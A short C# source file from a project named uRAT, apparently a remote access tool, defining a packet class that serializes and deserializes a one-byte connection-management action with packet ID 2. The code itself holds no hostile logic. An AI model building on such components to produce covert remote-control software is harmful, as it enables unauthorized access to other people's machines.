using System.IO;
using uNet2.Packet;

namespace uRAT.CoreClientPlugin.ConnectionManagement.Packets
{
    class ConnectionManagementPacket : IDataPacket
    {      
        public int PacketId
        {
            get { return 2; }
        }

        public ConnectionAction Action { get; set; }

        public ConnectionManagementPacket()
        {
        }

        public ConnectionManagementPacket(ConnectionAction action)
        {
            Action = action;
        }

        public void SerializeTo(Stream stream)
        {
            var bw = new BinaryWriter(stream);
            bw.Write(PacketId);
            bw.Write((byte) Action);
        }

        public void DeserializeFrom(Stream stream)
        {
            var br = new BinaryReader(stream);
            Action = (ConnectionAction) br.ReadByte();
        }
    }
}
